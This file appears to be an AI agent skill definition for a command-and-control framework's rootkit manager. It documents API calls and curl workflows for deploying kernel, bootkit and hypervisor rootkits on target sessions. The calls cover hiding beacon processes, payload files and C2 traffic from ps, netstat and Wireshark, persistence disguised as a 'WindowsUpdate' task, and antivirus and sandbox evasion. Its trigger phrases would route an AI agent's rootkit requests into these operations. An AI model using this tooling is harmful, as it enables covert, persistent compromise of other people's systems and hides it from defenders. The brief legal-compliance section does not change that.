---
name: quantum-c2-rootkit-manager
description: >
  Quantum C2 rootkit manager skill. Use when the user asks about rootkits, deep persistence, or advanced evasion. Triggers on: "rootkit", "deep persistence", "kernel-level", "process hiding", "file hiding", "network hiding", "detection avoidance", "bootkit", "advanced evasion".
---

# Quantum C2 Rootkit Manager

Deploy and manage kernel-level rootkits for deep persistence and advanced evasion.

## Rootkit Types

### Kernel Rootkits
| Type | Level | Stealth | Detection |
|------|-------|---------|-----------|
| `ldr_kernel` | Kernel mode | Very High | High |
| `hook_rootkit` | Hook-based | High | Medium |
| `dm_rootkit` | Device mapper | Very High | High |
| `ebpf_rootkit` | eBPF | High | Medium |
| `hypervisor` | VM-based | Maximum | Very High |

### User-Mode Rootkits
| Type | Level | Stealth | Detection |
|------|-------|---------|-----------|
| `userland_hook` | User mode | Medium | Low |
| `process_hollowing` | User mode | High | Medium |
| `thread_hijacking` | User mode | High | Medium |

## Rootkit Deployment

### Deploy Kernel Rootkit
```bash
POST /api/rootkit/deploy
{
  "target_id": "sess-abc123",
  "type": "ldr_kernel",
  "options": {
    "hide_processes": true,
    "hide_files": true,
    "hide_network": true,
    "hide_modules": true,
    "anti_debug": true,
    "anti_vm": true,
    "persistence": {"method": "bootkit"}
  }
}
```

### Rootkit Status
```bash
GET /api/rootkit/status/{rootkit_id}
```

**Response:**
```json
{
  "rootkit_id": "rk-abc123",
  "type": "ldr_kernel",
  "target_id": "sess-abc123",
  "status": "active",
  "loaded_at": "2024-01-15T10:00:00Z",
  "kernel_version": "5.15.0",
  "platform": "linux",
  "features": {
    "process_hiding": true,
    "file_hiding": true,
    "network_hiding": true,
    "module_hiding": true
  },
  "detection_evasion": {
    "anti_debug": true,
    "anti_vm": true,
    "signature_evading": true
  }
}
```

## Process Hiding

### Hide Process
```bash
POST /api/rootkit/processes/hide
{
  "rootkit_id": "rk-abc123",
  "target_pid": 1234,
  "hide_from": ["ps", "top", "tasklist", "wmic", "procmon"]
}
```

### Hide Process by Pattern
```bash
POST /api/rootkit/processes/hide/pattern
{
  "rootkit_id": "rk-abc123",
  "pattern": "*beacon*",
  "hide_from": ["all"]
}
```

### Process Hiding Status
```bash
GET /api/rootkit/processes/hiding/{rootkit_id}
```

**Response:**
```json
{
  "hidden_processes": [
    {"pid": 1234, "name": "beacon.exe", "hidden_from": ["ps", "top", "tasklist"]},
    {"pid": 5678, "name": "c2_agent", "hidden_from": ["all"]}
  ],
  "total_hidden": 2
}
```

## File Hiding

### Hide File
```bash
POST /api/rootkit/files/hide
{
  "rootkit_id": "rk-abc123",
  "path": "/tmp/.hidden_payload",
  "hide_methods": ["rootkit", "bind_shell", "acl_modification"]
}
```

### Hide Directory
```bash
POST /api/rootkit/files/hide/directory
{
  "rootkit_id": "rk-abc123",
  "path": "/var/.secret",
  "recursive": true
}
```

### File Hiding Status
```bash
GET /api/rootkit/files/hiding/{rootkit_id}
```

**Response:**
```json
{
  "hidden_files": [
    {"path": "/tmp/.hidden_payload", "size_bytes": 4521, "hidden_by": "rootkit"},
    {"path": "/var/.secret/config.enc", "size_bytes": 1024, "hidden_by": "bind_shell"}
  ],
  "total_hidden": 2,
  "total_size_bytes": 5545
}
```

## Network Connection Hiding

### Hide Network Connection
```bash
POST /api/rootkit/network/hide
{
  "rootkit_id": "rk-abc123",
  "connections": [
    {"local_port": 4444, "remote_ip": "10.0.0.1", "remote_port": 80, "protocol": "tcp"}
  ],
  "hide_from": ["netstat", "ss", "lsof", "wireshark"]
}
```

### Hide All C2 Traffic
```bash
POST /api/rootkit/network/hide/all-c2
{
  "rootkit_id": "rk-abc123",
  "c2_ports": [443, 8443, 53]
}
```

### Network Hiding Status
```bash
GET /api/rootkit/network/hiding/{rootkit_id}
```

## Persistence Mechanisms

### Persistence Types
| Method | Platform | Persistence |
|--------|----------|-------------|
| `bootkit` | All | Very High |
| `vbr_rootkit` | BIOS/UEFI | Very High |
| `kernel_module` | Linux | High |
| `driver` | Windows | High |
| `scheduled_task` | Windows | Medium |
| `launchd` | macOS | High |
| `systemd` | Linux | High |

### Deploy Persistence
```bash
POST /api/rootkit/persistence/deploy
{
  "rootkit_id": "rk-abc123",
  "methods": [
    {"type": "bootkit", "stage": "boot"},
    {"type": "kernel_module", "module_name": "hidden_module"},
    {"type": "scheduled_task", "name": "WindowsUpdate", "trigger": "logon"}
  ]
}
```

### Persistence Status
```bash
GET /api/rootkit/persistence/status/{rootkit_id}
```

## Detection Avoidance

### Evasion Techniques
| Technique | Description | Effectiveness |
|-----------|-------------|---------------|
| `anti_debug` | Detect and evade debuggers | High |
| `anti_vm` | Detect virtual machines | Medium |
| `anti_sandbox` | Detect sandbox environments | Medium |
| `signature_evading` | Avoid AV signatures | High |
| `code_obfuscation` | Obfuscate binary | Medium |
| `sleep_obfuscation` | Random sleep intervals | Low |
| `api_hashing` | Hash API calls | High |
| `string_encryption` | Encrypt strings | Medium |

### Configure Evasion
```bash
POST /api/rootkit/evasion/config
{
  "rootkit_id": "rk-abc123",
  "techniques": {
    "anti_debug": {"enabled": true, "method": "IsDebuggerPresent"},
    "anti_vm": {"enabled": true, "method": "hypervisor_detect"},
    "signature_evading": {"enabled": true, "method": "polymorphic"},
    "api_hashing": {"enabled": true, "hash_algorithm": "djb2"}
  }
}
```

### Evasion Status
```bash
GET /api/rootkit/evasion/status/{rootkit_id}
```

## Bootkit Deployment

### Deploy Bootkit
```bash
POST /api/rootkit/bootkit/deploy
{
  "rootkit_id": "rk-abc123",
  "target": "mbr",
  "options": {
    "hide_bootloader": true,
    "persist_through_reboot": true,
    "stealth_mode": true
  }
}
```

### Bootkit Status
```bash
GET /api/rootkit/bootkit/status/{rootkit_id}
```

## Hypervisor-Level Rootkit

### Deploy Hypervisor
```bash
POST /api/rootkit/hypervisor/deploy
{
  "rootkit_id": "rk-abc123",
  "type": "vmx",
  "options": {
    "hide_rootkit": true,
    "hide_vmx": true,
    "emulate_hardware": true
  }
}
```

### Hypervisor Status
```bash
GET /api/rootkit/hypervisor/status/{rootkit_id}
```

## Rootkit Removal

### Graceful Removal
```bash
POST /api/rootkit/remove/graceful
{
  "rootkit_id": "rk-abc123",
  "cleanup": {
    "remove_persistence": true,
    "remove_hidden_files": true,
    "remove_hidden_processes": true,
    "restore_network": true
  }
}
```

### Force Removal
```bash
POST /api/rootkit/remove/force
{
  "rootkit_id": "rk-abc123",
  "system_restart": true
}
```

### Removal Verification
```bash
GET /api/rootkit/removal/verify/{rootkit_id}
```

**Response:**
```json
{
  "verification_id": "verify-001",
  "status": "complete",
  "rootkit_removed": true,
  "residual_artifacts": 0,
  "checks": [
    {"name": "kernel_module", "status": "clean"},
    {"name": "hidden_processes", "status": "clean"},
    {"name": "hidden_files", "status": "clean"},
    {"name": "boot_sector", "status": "clean"}
  ]
}
```

## Legal Compliance Checking

### Compliance Check
```bash
GET /api/rootkit/compliance/check
{
  "jurisdiction": "US",
  "operation_type": "authorized_testing"
}
```

**Response:**
```json
{
  "compliant": false,
  "requirements": [
    {"id": "req-001", "description": "Written authorization required", "status": "not_met"},
    {"id": "req-002", "description": "Kernel rootkits require special approval", "status": "not_met"}
  ],
  "warnings": [
    {"id": "warn-001", "description": "Bootkit deployment may violate system integrity laws"},
    {"id": "warn-002", "description": "Hypervisor rootkit requires hardware-level authorization"}
  ]
}
```

## API Reference

### Deployment
```
POST   /api/rootkit/deploy
GET    /api/rootkit/status/{id}
POST   /api/rootkit/remove/graceful
POST   /api/rootkit/remove/force
GET    /api/rootkit/removal/verify/{id}
```

### Process Hiding
```
POST   /api/rootkit/processes/hide
POST   /api/rootkit/processes/hide/pattern
GET    /api/rootkit/processes/hiding/{id}
```

### File Hiding
```
POST   /api/rootkit/files/hide
POST   /api/rootkit/files/hide/directory
GET    /api/rootkit/files/hiding/{id}
```

### Network Hiding
```
POST   /api/rootkit/network/hide
POST   /api/rootkit/network/hide/all-c2
GET    /api/rootkit/network/hiding/{id}
```

### Persistence
```
POST   /api/rootkit/persistence/deploy
GET    /api/rootkit/persistence/status/{id}
```

### Evasion
```
POST   /api/rootkit/evasion/config
GET    /api/rootkit/evasion/status/{id}
```

### Bootkit
```
POST   /api/rootkit/bootkit/deploy
GET    /api/rootkit/bootkit/status/{id}
```

### Hypervisor
```
POST   /api/rootkit/hypervisor/deploy
GET    /api/rootkit/hypervisor/status/{id}
```

### Compliance
```
GET    /api/rootkit/compliance/check
```

## Workflows

### Deploy Complete Rootkit
```bash
# 1. Check compliance
curl http://localhost:8000/api/rootkit/compliance/check

# 2. Deploy rootkit
curl -X POST http://localhost:8000/api/rootkit/deploy \
  -H "Content-Type: application/json" \
  -d '{"target_id": "sess-abc123", "type": "ldr_kernel"}'

# 3. Configure hiding
curl -X POST http://localhost:8000/api/rootkit/evasion/config \
  -H "Content-Type: application/json" \
  -d '{"rootkit_id": "rk-001", "techniques": {"anti_debug": true, "anti_vm": true}}'

# 4. Deploy persistence
curl -X POST http://localhost:8000/api/rootkit/persistence/deploy \
  -H "Content-Type: application/json" \
  -d '{"rootkit_id": "rk-001", "methods": [{"type": "bootkit"}]}'

# 5. Verify status
curl http://localhost:8000/api/rootkit/status/rk-001
```

### Remove Rootkit
```bash
# 1. Graceful removal
curl -X POST http://localhost:8000/api/rootkit/remove/graceful \
  -H "Content-Type: application/json" \
  -d '{"rootkit_id": "rk-001", "cleanup": {"remove_persistence": true}}'

# 2. Verify removal
curl http://localhost:8000/api/rootkit/removal/verify/rk-001
```

## Best Practices

1. **Check compliance first** — Rootkits have legal implications
2. **Use least persistence** — Only what is necessary
3. **Document deployment** — Track all rootkit installations
4. **Plan removal** — Ensure cleanup is possible
5. **Test evasion** — Validate anti-detection features
6. **Monitor system health** — Rootkits can cause instability
7. **Verify removal** — Ensure no artifacts remain
8. **Limit scope** — Only deploy on authorized systems

## Troubleshooting

### Rootkit Not Loading
```bash
# Check status
curl http://localhost:8000/api/rootkit/status/rk-001

# Check kernel compatibility
curl http://localhost:8000/api/rootkit/status/rk-001 | jq '.kernel_version'
```

### Detection by AV
```bash
# Check evasion status
curl http://localhost:8000/api/rootkit/evasion/status/rk-001

# Add evasion techniques
curl -X POST http://localhost:8000/api/rootkit/evasion/config \
  -d '{"rootkit_id": "rk-001", "techniques": {"signature_evading": true}}'
```

### System Instability
```bash
# Force removal
curl -X POST http://localhost:8000/api/rootkit/remove/force \
  -d '{"rootkit_id": "rk-001", "system_restart": true}'
```
